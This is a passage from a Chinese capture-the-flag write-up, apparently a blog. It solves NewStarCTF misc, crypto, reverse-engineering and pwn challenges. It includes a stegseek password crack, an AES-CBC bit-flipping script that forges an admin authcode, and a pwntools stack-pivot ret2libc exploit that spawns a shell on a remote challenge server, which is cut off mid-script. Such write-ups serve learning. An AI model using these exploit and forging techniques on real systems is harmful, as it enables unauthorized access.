\n```git stash list(查看修改列表)```\n  \n![](http://cdn.anyiblog.top/common/1666527765556-56dcaf27-8e48-4f0f-aa1c-d6f7ef47289b.jpg)  \n有东西再看下修改列表\n  \n```git stash show(查看修改列表)```\n  \n![](http://cdn.anyiblog.top/common/1666527765893-89994e11-3a26-4b55-94e1-410ad0986550.jpg)  \n看到flag了，最后提取即可\n  \n```git stash apply(把上面的文件复原)```\n  \n![](http://cdn.anyiblog.top/common/1666527766265-167bb971-6297-4529-991f-37d86a9e82e4.jpg)  \n得到flag.txt\n  \n![](http://cdn.anyiblog.top/common/1666527766658-8b4e3f97-c813-4f92-93ee-3586fc466f8f.jpg)  \nFlag：flag{Yesec#1s#c@ibi}\n  \n### Misc4.奇怪的文本\n  \n下载附件\n  \n![](http://cdn.anyiblog.top/common/1666527767100-91c13369-1409-4ed3-a6b3-168f033f87e4.jpg)  \n得到这堆奇怪的文本，刚开始还在试是什么加密\n  \n然后放quip上跑没结果，又试了很多加密方法都不是，突然想到字频分析这个东西\n  \n分析一下得到flag，还是比较脑洞的\n  \n![](http://cdn.anyiblog.top/common/1666527767602-206ab858-6639-45aa-93a0-7c8a8d97a641.jpg)  \nFlag：flag{S0B48yCA}\n  \n脑洞题就是这样，想到的人做的很快，想不到的人一周都想不明白到底是啥加密，很真实。。\n  \n### Misc5.qsdz's girlfriend 5\n  \n下载附件得到一个passwd.txt和加密压缩包。\n  \npasswd.txt\n  \n![](http://cdn.anyiblog.top/common/1666527767963-d4cd3b3c-69ef-4bb5-8c7c-5d7d30b8af4a.jpg)  \n虽然给了passwd.txt但还是对压缩包尝试了伪加密 爆破密码等，无果\n  \n之后就是对passwd.txt进行分析，各种分析之后也是无果\n  \n貌似看起来无解呢。\n  \n突然想到了对题目这个压缩包进行分析，果然找到了一点线索\n  \n![](http://cdn.anyiblog.top/common/1666527768465-54451a37-7581-4f46-b9f1-09e585f49fe9.jpg)  \n![](http://cdn.anyiblog.top/common/1666527768887-265a6f84-9d78-467e-b8f4-8ce6c912276f.jpg)  \n![](http://cdn.anyiblog.top/common/1666527769271-8830abad-37ac-4eb9-94f0-015e9ff53a31.jpg)  \n芜湖，得到了提示NTFS流隐写。\n  \n之后就是把压缩包所有文件解压到一个文件夹下进行分析\n  \n注意要用winrar解压，如果用bandizip解压会出现这种情况 导致分离不出passwd.txt\n  \n（可能跟算法有关系，有兴趣可以去了解下）\n  \n![](http://cdn.anyiblog.top/common/1666527769724-f9365b23-0ea8-4388-8ecf-526646fff59d.jpg)  \nwinrar解压后。NTFS分析得到新的passwd.txt\n![](http://cdn.anyiblog.top/common/1666527770238-7420abb7-e145-4e23-91a2-5fd101b88893.jpg)  \n导出得到密码：```Can_you_crack_steghide?```\n  \n  \n![](http://cdn.anyiblog.top/common/1666527770638-9772a7eb-c283-41f3-8b30-a9267dc30851.jpg)  \n用密码解压压缩包得到图片second\\_gf.jpg\n  \n根据这个密码提示steghide，那么解压后肯定就是尝试steghide了\n  \n本来我以为只有弱密码这么简单.... 出题人太卑鄙辣\n  \n![](http://cdn.anyiblog.top/common/1666527770981-a5b2ef24-badb-414f-9823-f109ce251b8d.jpg)  \n  \n本来百度到的都是那种py脚本在那里跑，贼慢 而且字典不知道 搞了个纯数字在那里跑。。\n  \n实际上出题人是想通过搜索crack\\_steghide搜到工具stegseek（赛博脚本嗷），然后一把梭。。\n  \n字典是kali的rockyou.txt，然后这个工具默认字典就是这个 就可以出了。\n  \n不过不错的一点是啥捏，就是这个工具是真挺不错 rockyou.txt将近一个g的字典也只用几十秒跑完。\n  \nstegseek安装：[https://github.com/RickdeJager/stegseek/releases](https://github.com/RickdeJager/stegseek/releases)\n  \n下载.deb文件后 sudo apt install ./stegseek\\_0.5-1.deb\n  \n之后就可以用了\n  \n```\nstegseek second_gf.jpg\n```\n  \n![](http://cdn.anyiblog.top/common/1666527771347-f1ddc106-6172-4e67-ba4f-86645d2161ab.jpg)  \n得到密码 iloveelaina ，并导出文件内容到.jpg.out里\n  \n最后cat得到flag\n  \n  \n![](http://cdn.anyiblog.top/common/1666527771682-8c7b1343-9062-4878-9da3-20be78c40a6b.jpg)  \n\nflag{W3lc0me_tO_be_NewSt@rs!}\n\n  \nWelcome to be Newstar! Goodbye Newstar...\n  \n### Misc6.12bubu\\_pixel\n  \n这道题需要nc连接\n  \n连接后发现是字符画，映出了好几张图像\n  \n![](http://cdn.anyiblog.top/common/1666527772991-7c1ce947-bade-43da-bce9-22ec354055ea.jpg)  \n刚开始拿到题目 思路其实就是把这个字符串变成图像，再从图像隐写的方向去解题。\n  \n这里用socket连接，再用recv(1024)去接收字符串\n  \n先接收一部分内容 看看这个有颜色的数字是怎么实现的\n  \n![](http://cdn.anyiblog.top/common/1666527773422-37060891-d0a5-4f11-80f4-6647b332c5d7.jpg)  \n这个东西是颜色代码 哈哈哈 写python脚本比较多所以比较熟悉\n  \n其实是有名字的 叫ANSI码，感兴趣可以了解下\n  \n拿到这一串字符串前面的\\\\x1b\\[A作用和\\\\r一样，对结果不影响 所以处理的时候可以直接replace了\n  \n然后看图片红框圈起来的部分 这些就是实现颜色的主要部分了\n  \n```\n\\x1b[38;2;0;0;0m9\n```\n  \n这一部分重点是中间分号的三个数字，这三个数字就代表着R G B 所以能实现颜色\n  \n可以用\n```\necho -e \"\\x1b[38;2;0;0;0m9\"\n```\n看看效果\n  \n这里我用红色的RGB做例子\n  \n![](http://cdn.anyiblog.top/common/1666527773780-61c2faac-d7e9-4d5e-9a9d-b9c2d9d9a9c4.jpg)  \n可以看到印证了我前面所说的，这一个特征刚好也是后面摸索出来的规律。\n  \n现在思路就很明显了，我们只需提取服务器的所有字符串，然后对字符串进行替换、正则匹配处理，取RGB值到列表中，一个元素代表着一个像素点，再创建一个图像（因为还不知道宽高，所以图像宽高可以设的高一点）x轴就取每一个像素点，然后接收的字符串还有换行字符串\\\\n，以这个作为特征来区分y轴。最后遍历x y把rgb写进去 就可以实现字符串转换成图像。\n  \n后面测试过来得到小图大小为200\\*200，就顺便把每张图片做了分割。\n  \n贴下脚本\n  \n```\nimport socket\nimport re\nfrom PIL import Image\n  \n  \ns = socket.socket()\n  \n  \ns.connect(('node4.buuoj.cn',26994))\n  \n  \n  \n  \ntotal_data = b''\n  \n  \ndata = s.recv(2048)\nwhile data:\n    # 将收到的数据拼接起来\n    total_data += data\n    data = s.recv(2048)\nimg = Image.new('RGB',(200,6000))\nprint(len(total_data))\ntotal_data = total_data.replace(b'\\x1b[A',b'')\nx = 0\ny = 0\nt = 1\nfor image in total_data.split(b'\\n\\n'):\n    img = Image.new('RGBA',(200,200))\n    for data in image.split(b'\\n'):\n        for color in re.findall(b'\\x1b\\[38.*?m', data):\n            r,g,b =  re.findall(b'2;(.*)m',color)[0].split(b';')\n            print((x,y),int(r),int(g),int(b))\n            img.putpixel((x,y),(int(r),int(g),int(b)))\n            x+=1\n        y+=1\n        x=0\n    print('Image %s already'%t)\n    img.save('%s.png'%t)    \n    t += 1\n```\n  \n运行完得到了一堆小图\n  \n![](http://cdn.anyiblog.top/common/1666527774219-d6917a68-59f8-42d2-b00e-48ba447df840.jpg)  \n完美还原。\n  \n之后问了出题人，出题人告诉我题目的pixel是提示\n  \n于是就找pixel cloack-pixel,steganographer等等，试了steg还是没找对\n  \n然后就找到了running\\_pixel，果然搜索也是一门艺术 哎\n  \n![](http://cdn.anyiblog.top/common/1666527774715-3466e56c-8b6e-4fa2-ac1b-797225d434b2.jpg)  \n突然想到这么多图确实也是gif，没毛病\n  \nrunning\\_pixel就是将每张图片中RGB为(233,233,233)值的像素点提取出来，然后拼接到一个图像上绘制成flag。\n  \n在nc看图像的时候确实每张图片都有一点小白点，没想到这也能是隐写\n  \n```\nfrom PIL import Image\n  \n  \nflag_img = Image.new('1', (400, 400))\n# mode=1 1位黑白像素，每字节存储一个像素\nfor name in range(1, 29):\n    image = Image.open(str(name) + '.png') \n    image = image.convert(\"RGB\")  # python PIL将RGB图像转换为纯黑白imag\n    width, height = image.size\n    for w in range(width):\n        for h in range(height):\n            if image.getpixel((w, h)) == (233, 233, 233):\n                flag_img.putpixel((w,h), 1)\n  \n  \n    flag_img.save('res.png')\n```\n  \n运行得到图像\n  \n![](http://cdn.anyiblog.top/common/1666527775074-eeafed12-0a3a-400a-9578-78a0a31071ff.jpg)  \nflag出来了！\n  \n最后完善了脚本 写了个小轮子，贴下我最后的完整脚本\n  \n```\nfrom PIL import Image\nimport socket\nimport re\n  \n  \ns = socket.socket()\n  \n  \ns.connect(('node4.buuoj.cn',26994))\n  \n  \ntotal_data = b''\n  \n  \ndata = s.recv(1024)\nwhile data:\n    # 将收到的数据拼接起来\n    total_data += data\n    data = s.recv(1024)\nprint('[*] Data is already')\nflag_img = Image.new('1', (400, 400))\ntotal_data = total_data.replace(b'\\x1b[A',b'')\n  \n  \nprint('[*]Now start to extract img_pixel')\nt = 0\nfor image in total_data.split(b'\\n\\n'):\n    if image != \"\":\n        t += 1\n        img = Image.new('RGB',(200,200))\n        x = 0\n        y = 0\n        for data in image.split(b'\\n'):\n            for color in re.findall(b'\\x1b\\[38.*?m', data):\n                r,g,b =  re.findall(b'2;(.*)m',color)[0].split(b';')\n                #print((x,y),int(r),int(g),int(b))\n                img.putpixel((x,y),(int(r),int(g),int(b)))\n                x+=1\n            y+=1\n            x=0\n        print('Image %s already'%t)\n        # mode=1 1位黑白像素，每字节存储一个像素\n        width, height = img.size\n        for w in range(width):\n            for h in range(height):\n                if img.getpixel((w, h)) == (233, 233, 233):\n                    flag_img.putpixel((w,h), 1)\n        #img.save('%s.png'%t)    \n  \n  \nprint('[+] Success!')\n  \n  \nflag_img.show()\nflag_img.save('flag.png')\n```\n  \n![](http://cdn.anyiblog.top/common/1666527775532-8aa2add4-51da-46b4-82c7-8ae1a1f003df.jpg)  \n  \nFlag：flag{how\\_about\\_ansi\\_and\\_running\\_pixel}\n  \n  \n# Crypto\n  \n### Crypto1.flip-flop\n  \n```\nimport os\nfrom Crypto.Cipher import AES\nfrom secret import FLAG\nauth_major_key = os.urandom(16)\n  \n  \nBANNER = \"\"\"\nLogin as admin to get the flag !\n\"\"\"\n  \n  \nMENU = \"\"\"\nEnter your choice\n[1] Create NewStarCTF Account\n[2] Create Admin Account\n[3] Login\n[4] Exit\n\"\"\"\n  \n  \nprint(BANNER)\n  \n  \nwhile True:\n    print(MENU)\n  \n  \n    option = int(input('> '))\n    if option == 1:\n        auth_pt = b'NewStarCTFer____'\n        user_key = os.urandom(16)\n        cipher = AES.new(auth_major_key, AES.MODE_CBC, user_key)\n        code = cipher.encrypt(auth_pt)\n        print(f'here is your authcode: {user_key.hex() + code.hex()}')\n    elif option == 2:\n        print('GET OUT !!!!!!')\n    elif option == 3:\n        authcode = input('Enter your authcode > ')\n        user_key = bytes.fromhex(authcode)[:16]\n        code = bytes.fromhex(authcode)[16:]\n        cipher = AES.new(auth_major_key, AES.MODE_CBC, user_key)\n        auth_pt = cipher.decrypt(code)\n        if auth_pt == b'AdminAdmin______':\n            print(FLAG)\n        elif auth_pt == b'NewStarCTFer____':\n            print('Have fun!!')\n        else:\n            print('Who are you?')\n    elif option == 4:\n        print('ByeBye')\n        exit(0)\n    else:\n        print(\"WTF\")\n```\n  \n题目是菜单题，第一个功能就是获取明文为 NewStarCTFer\\_\\_\\_\\_ 的AES加密中的iv参数和加密结果code\n  \n第三个功能是要求我们输入一个authcode 会把这个authcode解析给user\\_key和code，然后最终解出来的结果要变成AdminAdmin\\_\\_\\_\\_\\_\\_\n  \n其它两个功能没啥用，这两个比较重要。\n  \n这题考察的是AES的CBC字节翻转攻击，学习可以参考这篇文章[https://www.likecs.com/show-205079481.html](https://www.likecs.com/show-205079481.html) 我就是看这篇文章做出来的。\n（ 本来我是拒绝的，但是我看了下题还挺感兴趣的，就试着做 没想到就做出来了）\n  \n因为key（auth\\_major\\_key）和iv（user\\_key）是随机分配的，我们不能得知 ，但是user\\_key是可控的，可以通过user\\_key去修改解密的结果\n  \n篡改是通过A ^ B ^ C 将A修改为C，原理参考上面的文章\n  \n比如我想把解密结果的N改成A，那么就是\n  \n```\nuser_key[0] ^ ord('N') ^ ord('A') #把user_key的第一个字节改成A\n```\n  \n可以把题目的那个py文件拿来调试，把各个值都打印出来看看实际结果怎么样，建议是先调试弄明白了然后再搞服务端那边。\n  \n就此写脚本 推出修改后的密文，再发送给服务端 就可以得到flag。\n  \n```\nimport binascii\n  \n  \ndef flip():\n    res = \"a25e151f887fbede44d418631fba063eb11806e1b8a242ad46a383aad1dbe1b0\" #这里填写服务端分配给你的key\n    user_key,code = bytes.fromhex(res)[:16],bytes.fromhex(res)[16:]\n  \n  \n    newcipher = list(user_key)\n    print(user_key.hex(),code.hex())\n    print(newcipher)\n  \n  \n    newcipher[0] = newcipher[0] ^ ord('N') ^ ord('A')\n    newcipher[1] = newcipher[1] ^ ord('e') ^ ord('d')\n    newcipher[2] = newcipher[2] ^ ord('w') ^ ord('m')\n    newcipher[3] = newcipher[3] ^ ord('S') ^ ord('i')\n    newcipher[4] = newcipher[4] ^ ord('t') ^ ord('n')\n    newcipher[5] = newcipher[5] ^ ord('a') ^ ord('A')\n    newcipher[6] = newcipher[6] ^ ord('r') ^ ord('d')\n    newcipher[7] = newcipher[7] ^ ord('C') ^ ord('m')\n    newcipher[8] = newcipher[8] ^ ord('T') ^ ord('i')\n    newcipher[9] = newcipher[9] ^ ord('F') ^ ord('n')\n    newcipher[10] = newcipher[10] ^ ord('e') ^ ord('_')\n    newcipher[11] = newcipher[11] ^ ord('r') ^ ord('_')\n    print(newcipher)\n    rescipher = b\"\"\n    for i in newcipher:\n        rescipher += binascii.unhexlify(hex(i)[2:].zfill(2))\n    print(rescipher.hex())\n  \n  \n    print('\\nresult:%s%s'%(rescipher.hex(),code.hex()))\n  \n  \nflip()\n```\n  \n把res改成服务端给的key，然后运行得到新的key再发送给服务端即可。\n  \n![](http://cdn.anyiblog.top/common/1666527775909-ec07f722-3304-4996-9bc2-01e06f38d073.jpg)  \nFlag：flag{filp\\_the\\_word!!!!!!!!}\n  \n# Reverse\n\n### Reverse1.拔丝溜肆 (easy)\n  \n64位程序，无壳。IDA分析\n  \n![](http://cdn.anyiblog.top/common/1666527776371-80106342-8e31-41b8-9daf-717202615f6d.jpg)  \n  \nmain函数就是把输入的东西经过加密后要等于Str那个密文。\n  \n跟进sub\\_140011069看加密程序\n  \n![](http://cdn.anyiblog.top/common/1666527776858-09878fc9-e0b9-4499-9b90-7bb66060e2c4.jpg)这个函数一看就是base64加密的特征 很眼熟。\n  \n本来我以为这是个很简单的题目，但base64的表呢？\n跟进sub\\_14001127B函数 看看干了啥\n![](http://cdn.anyiblog.top/common/1666527777256-7eceb14c-7efd-41f7-ae49-fff00abf4761.jpg)这里是做了随机，因为base64表有64位，所以对表进行了一个随机遍历\n  \nStr表：\n  \n![](http://cdn.anyiblog.top/common/1666527777668-67010254-2d12-4df7-a912-dfb36897e3d9.jpg)  \n随机的就比较烦了，需要爆破\n  \n![](http://cdn.anyiblog.top/common/1666527778117-bde288c6-9fe6-4875-a3dd-9e01904b3431.jpg)  \n我们输入的字符串被要求42位长，v6每次加3，那么就要遍历42 /3 = 14次，也就是说有14个不同表，然后每次选用一个表时会赋值给byte\\_14001E1C0 4个字符串\n  \n加密之后要和str2判断。\n  \n爆破就完了，把64种可能的表都写下来，然后再遍历ascii表 符合条件就筛出 最后得到结果\n  \n![](http://cdn.anyiblog.top/common/1666527778582-b0fc813d-5dd3-40bc-9a7a-c196163f72e4.jpg)  \n当时结果写完有很多种可能，还想遍历每个列表的字符串来写，但是发现不会。。好在观察特征发现 每隔几组就带有一个-，而且基本是数字 a-f这些，后面才发现是16进制的字符串，然后拼接得到flag。\n（不得不说我要是没注意到这个特征我现在可能还卡在循环）\n  \n贴下最终脚本：\n  \n```\nimport random\nimport string\n  \n  \ncipher = \"CPaKBfUZFcNwW9qCKgyvuS2PGPQ9mttGc/wCNS0w6hDwGOSsOkOEkL5V\"\n  \n  \nstr1 = [0]*56\nstr = \"\"\n  \n  \n  \n  \ndef gettable():\n    Str = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\n    table = ['']*99\n    v1 = random.randint(0,64)\n    for i in range(len(Str)):\n        table[i] = Str[(v1+i)%64]\n    return (''.join(table))\n  \n  \ndef encode(a1,a2): #a1=str(input) a2=str1\n    v5 = len(a1)\n    v3 = v5 >> 31\n    v3 = v5 %3\n    v2 = 3\n    v6 =0\n    v7 = 0\n    while v6<v5:\n        table = gettable()\n        print(table)\n        a2[v7] = table[a1[v6]>>2]\n        a2[v7+1] = table[((a1[v6 + 1] & 0xF0) >> 4) | (16 * (a1[v6] & 3))]\n        a2[v7+2] = table[((a1[v6 + 2] & 0xC0) >> 6) | (4 * (a1[v6 + 1] & 0xF))]\n        v3 = v7+3\n        a2[v3] = table[a1[v6 + 2] & 0x3F]\n        v6 += 3\n        v7 += 4\n    print(''.join(a2))\n    #mz+u3VL/WUDfNL6WJH2SDBwMtra2YWFhusb3CAvL64nDB/uKfdMovtcU\n  \n  \ndef decode():\n    table = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\n    table_list = []\n    for i in range(len(table)):\n        temp = \"\"\n        for k in range(len(table)):\n            temp += table[(i+k)%64]\n        table_list.append(temp)\n    cipher = \"CPaKBfUZFcNwW9qCKgyvuS2PGPQ9mttGc/wCNS0w6hDwGOSsOkOEkL5V\"\n    cipher_list = []\n    for i in range(0,len(cipher),4):\n        cipher_list.append(cipher[i:i+4])\n    #ascii_table = (string.ascii_letters + string.digits + '!-?@_{}~').encode() #后面发现flag只有16进制，这个出题人真的是我醉了，改table\n    ascii_table = (string.hexdigits + \"lg{}-\").encode()\n    temp_list = ['0','0','0','0']\n    res = []\n    times = 0\n    for r in cipher_list:\n        #part = []\n        times+=1\n        print('[*] now times is :%s'%times)\n        print('-'*50)\n        for a in ascii_table:\n            for b in ascii_table:\n                for c in ascii_table:\n                    n = '%s%s%s'%(chr(a),chr(b),chr(c))\n                    for t in table_list:\n                        temp_list[0] = t[a>>2]\n                        temp_list[1] = t[((b & 0xF0) >> 4) | (16 * (a & 3))]\n                        temp_list[2] = t[((c & 0xC0) >> 6) | (4 * (b & 0xF))]\n                        temp_list[3] = t[c & 0x3F]\n                        if r == ''.join(temp_list):\n                            print(n,t)\n                            #part.append(n)\n                            res.append(n)\n        #res.append(part)\n    print(''.join(res))\n    #[['b\\\\ ', 'fla', 'V+]', '%hQ'], ['g{1', 'K\\tj', 'W:-', '&w!', '[Jn'], ['257', '6Ex', 'wIH', 'Bv;'], ['388', '7Hy', 'd\\x0bE', 'tLI', 'Cy<'], ['2-1', '6=r', 'w1B', 'Bn5', 'F~v'], ['p\\t=', 'CF1', 'GVr'], ['nIR', '-EB'], ['5E-', '9Un', 'vI=', 'zY~'], ['t\\x0cC', 'C96', 'GIw', 'Sz:'], ['5-0', '9=q', 'z1A', 'En4', 'I~u'], ['35B', 'p9R', 'CvF'], ['1F2', '5Vs', 'b\\t>', 'vZC'], ['63C', 'w7S', 'FtG'], ['38}', 'l,\\x0c', 'p<M', 'CyA', '/(<']][['b\\\\ ', 'fla', 'V+]', '%hQ'], ['g{1', 'K\\tj', 'W:-', '&w!', '[Jn'], ['257', '6Ex', 'wIH', 'Bv;'], ['388', '7Hy', 'd\\x0bE', 'tLI', 'Cy<'], ['2-1', '6=r', 'w1B', 'Bn5', 'F~v'], ['p\\t=', 'CF1', 'GVr'], ['nIR', '-EB'], ['5E-', '9Un', 'vI=', 'zY~'], ['t\\x0cC', 'C96', 'GIw', 'Sz:'], ['5-0', '9=q', 'z1A', 'En4', 'I~u'], ['35B', 'p9R', 'CvF'], ['1F2', '5Vs', 'b\\t>', 'vZC'], ['63C', 'w7S', 'FtG'], ['38}', 'l,\\x0c', 'p<M', 'CyA', '/(<']]\n#encode(b'flag{aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}',str1)\ndecode()\n```\n  \n![](http://cdn.anyiblog.top/common/1666527779034-4a087723-2d95-4261-8826-a1891652a34f.jpg)  \nFlag：flag{12573882-1CF1-EB5E-C965-035B1F263C38}\n  \n### Reverse2.E4sy\\_Mix (hard)\n  \n32位程序。IDA分析\n  \n![](http://cdn.anyiblog.top/common/1666527779521-60a28320-0d70-4078-947d-67c704523600.jpg)  \n上来进行了一个异或，然后进函数加密loc\\_402000。\n  \n这个函数有点问题要选中红色的部分按P修复\n  \n![](http://cdn.anyiblog.top/common/1666527780041-ca536c1d-86cb-4a15-867a-c05f16caad16.jpg)  \n一堆汇编语言，看不懂。\n  \n后面尝试着修复这个程序，但是不是修不修的问题 咋修都这个样 害！\n  \n卡了一段时间，直到我看到了这个：\n  \n![](http://cdn.anyiblog.top/common/1666527780431-57b0bd4f-6590-4ba9-99da-6d80c8b77c3c.jpg)  \n算是出题人的hint吗hh，写了个SMC，就好奇搜了下 结果就有了解题思路\n  \n```\nSMC，即Self Modifying Code，动态代码加密技术，指通过修改代码或数据，阻止别人直接静态分析，然后在动态运行程序时对代码进行解密，达到程序正常运行的效果。\n而计算机病毒通常也会采用SMC技术动态修改内存中的可执行代码来达到变形或对代码加密的目的，从而躲过杀毒软件的查杀或者迷惑反病毒工作者对代码进行分析。\n通常来说，SMC使用汇编去写会比较好，因为它涉及更改机器码，但SMC也可以直接通过C、C++来实现。\n```\n  \n贴下一下让我有思路的文章：[https://blog.csdn.net/weixin\\_40729735/article/details/121595169](https://blog.csdn.net/weixin_40729735/article/details/121595169)\n  \n这个SMC需要写.idc脚本，这个idc要根据实际情况修改，不能照抄。把IDA中需要解密的部分按U undefined掉，然后导入脚本 再次编译就得到了源码\n  \n```\n#include <idc.idc>\nstatic main()\n{\n    auto addr = 0x402000; //起始地址\n    auto i = 0;\n    for(i=0;addr+i<0x402039;i++) //结束地址\n    {\n        PatchByte(addr+i,Byte(addr+i)^0x54); //加密写的异或0x54\n    }\n}\n```\n  \n![](http://cdn.anyiblog.top/common/1666527780834-0c9aa394-e86a-493e-96aa-7f59d63ca6ca.jpg)  \n选中这一块按U\n  \n![](http://cdn.anyiblog.top/common/1666527781206-321a01df-77c1-447e-9323-fd6ea1b83054.jpg)  \n有黄色的部分就可以了，然后IDA选择File - Script file - xxx.idc 选刚刚写好的idc\n  \n导入后会发现字节发生了变化\n  \n![](http://cdn.anyiblog.top/common/1666527781581-71a48c02-f02b-4621-99ec-6cf1b8670867.jpg)  \n这时候再选中0x402000 - 0x402039的部分 按C强制转换函数\n  \n![](http://cdn.anyiblog.top/common/1666527782029-a3509358-4223-4383-9838-e75eeab24291.jpg)  \n再选中按P添加函数，此时就修复好了\n  \n![](http://cdn.anyiblog.top/common/1666527782393-a3c52148-3ac6-4c5f-aefa-32755d1c799c.jpg)  \n第一个函数：\n  \n  \n![](http://cdn.anyiblog.top/common/1666527782817-298ec00d-2ab3-4c58-bd77-f753604f0cf5.jpg)  \n第二个函数：\n  \n![](http://cdn.anyiblog.top/common/1666527783226-53617e25-6e80-4e5d-8df9-2372a1d94eec.jpg)  \n  \n实际上是一个RC4加密，对着解密即可。\n  \n写python解密的过程不得不感叹下C和python的差别真的很大，因为各种类型在python都是正常的 到了C就变成各种负数，脚本有一部分^-256是因为根据C的整型类型在python进行一个转换\n  \n脚本写的比较烂：\n```\nbyte_404490 = [0]*256\nbyte_404390 = [0]*256\nbyte_404018 = b\"flag{This_a_fake_flag}\"\na2 = len(byte_404018) #22\n  \n  \nfor i in range(0,256):\n    byte_404490[i] = i\n    byte_404390[i] = byte_404018[i % a2]\n#print(byte_404390)\n#print(byte_404490,byte_404390)\nv3 = 0\n#print(byte_404490)\nfor j in range(0,256):\n    v5 = byte_404490[j]\n    v3 = (v5 + byte_404390[j] + v3) % 256\n    result = byte_404490[v3]\n    if result > 127:\n        byte_404490[j] = result^-256\n    else:\n        byte_404490[j] = result\n    if v5 > 127:\n        byte_404490[v3] = v5^-256\n    else:\n        byte_404490[v3] = v5\n  \n  \nresult = 32 #32\nv3 = 0\nv4 = 0\n#a1 = [0]*len(byte_404490)\na1 = [161, 191, 182, 112, 99, 91, 59, 237, 244, 145, 129, 164, 189, 58, 83, 134, 91, 140, 219, 65, 27, 115, 225, 209, 242, 178, 223, 110, 22, 86, 34, 66, 252]\nfor i in range(0,result):\n    v3 = (v3 + 1) % 256\n    v5 = byte_404490[v3]\n    v4 = (v5 + v4) % 256\n    byte_404490[v3] = byte_404490[v4]\n    byte_404490[v4] = v5\n    #3print(v5,byte_404490[v3],v3)\n    a1[i] ^= byte_404490[v5 + byte_404490[v3]]\nflag = \"\"\nprint(a1)\nfor i in a1:\n    if i <0:\n        flag += chr(i^-256)\n    else:\n        flag += chr(i)\nprint(flag)\n```\n  \n运行得到flag\n  \n![](http://cdn.anyiblog.top/common/1666527783586-af93155f-cbf9-4246-94f6-a125ebd4c24d.jpg)  \n\nFlag：flag{RC4\\_and\\_SMC\\_is\\_interesting!}\n  \n# Pwn\n  \n### Pwn1.overflow me plz\n  \n呜呜呜自己通过调试做出来的一道题，感觉调试进步了！不容易！！\n  \n题目给了libc\n  \n检查：\n  \n![](http://cdn.anyiblog.top/common/1666527783979-87d1e847-b065-41aa-89de-0aac85f21e93.jpg)  \n主函数：\n  \n![](http://cdn.anyiblog.top/common/1666527784408-874b5586-6859-4171-88ad-4715f4681972.jpg)  \n主函数很简单，一个溢出\n  \n![](http://cdn.anyiblog.top/common/1666527784792-80b61a9d-38fe-4d38-8bc3-94605b056ac2.jpg)  \n溢出量很小，仅能溢出0xd0 - 0xc0 = 16 两个地址的大小 不过可以实现跳转和迁移。\n  \n所以这里思路就是栈迁移，这里打算泄露write的地址，第一次迁移要把write的地址泄露出来，然后重新跳转到输入点，之后构造libcbase 搞出system和binsh 最后第二次输入点再搞一次栈迁移，迁到system('/bin/sh')的地方。\n  \n迁移的地方选用bss段+0x500的地方，这个地方申请大点以免影响到其他段的内容\n  \n到了这个地址后把我们要写的payload写到bss+0x500的地方，payload就是ret2libc泄露write地址那样写（注意payload还写了返回地址为main\\_addr，是为了二次构造再发送），然后最后要填充0xc0的字符，最后16个字节就写p64(bss-8) + p64(leave\\_ret)\n  \n劫持rbp到bss段，让程序执行我们布置好的payload。\n  \n```\nfrom pwn import *\n  \ncontext.log_level = 'debug'\n  \np = remote('node4.buuoj.cn',25018)\n  \nleave_ret = 0x4006f7\n  \n  \nmain_addr = 0x400698\nread_addr = 0x4006d9\nrdi = 0x0000000000400763\nrsi_r15 = 0x0000000000400761\nwrite_got = elf.got['write']\nwrite_plt = elf.plt['write']\ncsu_end = 0x40075a\ncsu_front = 0x400740\n  \n  \nbss = elf.bss() + 0x500\n  \n  \nlog.info('bss:%s'%hex(bss))\n  \n  \n### First Overflow: rbp => bss , return read_addr to leak write_addr\n###\n  \n  \npayload = b'd'*0xc0 + p64(bss+0xc0) +p64(read_addr)\n  \n  \np.sendafter('it!\\n',payload)\n  \n  \nsleep(1)\n  \n  \n### Leak [write_addr] & return [main_addr]\n  \n  \npayload = p64(rdi) + p64(1) + p64(rsi_r15) + p64(write_got) + p64(0) + p64(write_plt) + p64(main_addr) #\n  \n  \npayload = payload.ljust(0xc0,b'b')\n  \n  \npayload += p64(bss-8) + p64(leave_ret)\n  \n  \np.send(payload)\n```\n  \n发送后如果没错就会把write\\_addr给打印出来，接收并构造libcbase即可\n  \n```\n### ret2libc: leak system_addr & binsh_addr\n  \n  \nwrite_addr = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))\n  \n  \nlog.info(\"write_addr:%s\"%hex(write_addr))\n  \n  \nlibc_base = write_addr - libc.sym['write']\nsystem = libc_base + libc.sym['system']\nbinsh = libc_base + next(libc.search(b'/bin/sh'))\n  \n  \nlog.info(\"system_addr:%s,binsh:%s\"%(hex(system),hex(binsh)))\n  \n```\n  \n  \n![](http://cdn.anyiblog.top/common/1666527785306-4fa7393e-e12f-488b-bab7-e9252c7cfe1c.jpg)  \n当时调试的时候做到这步就很开心了，因为能弹回main\\_addr就说明栈迁移的没错，payload写对了！\n  \n之后就是再发送system('/bin/sh')给bss段，进行一个二次栈迁移。\n  \n需要注意第二次bss段的地址跟第一次的地址不要离得太近，不然可能会冲突\n  \n```\nlog.info('Double Overvlow!try to getshell\\n===================')\n  \n  \n### Double Overflow: rdi+binsh+system = getshell\n  \n  \nbss = elf.bss() + 0x800 #new bss\n  \n  \npayload = b'a'*0xc0 + p64(bss+0xc0) +p64(read_addr)\n  \n  \np.sendafter('it!\\n',payload)\n  \n  \nsleep(1)\n  \n  \npayload = p64(rdi) + p64(binsh) +  p64(system)\n  \n  \npayload = payload.ljust(0xc0,b'c')\n  \n  \npayload += p64(bss-8) + p64(leave_ret)\n  \n  \np.send(payload)\n  \n  \n####################\n  \n  \np.interactive()\n```\n  \n最终Payload：\n  \n```\nfrom pwn import *\n  \n  \ncontext.log_level = 'debug'\n  \n  \n#p = process('./pwn')\n  \n  \np = remote('node4.buuoj.cn',26594)\n#p = gdb.debug('./pwn','break *0x601058')\n#p = gdb.debug('./pwn','break *0x400740')\n  \n  \nelf = ELF('./pwn')\nlibc = ELF('./libc-2.31.so')\n  \n  \nleave_ret = 0x4006f7\n  \n  \nmain_addr = 0x400698\nread_addr = 0x4006d9\nrdi = 0x0000000000400763\nrsi_r15 = 0x0000000000400761\nwrite_got = elf.got['write']\nwrite_plt = elf.plt['write']\ncsu_end = 0x40075a\ncsu_front = 0x400740\n  \n  \nbss = elf.bss() + 0x500\n  \n  \nlog.info('bss:%s'%hex(bss))\n  \n  \n### First Overflow: rbp => bss , return read_addr to leak 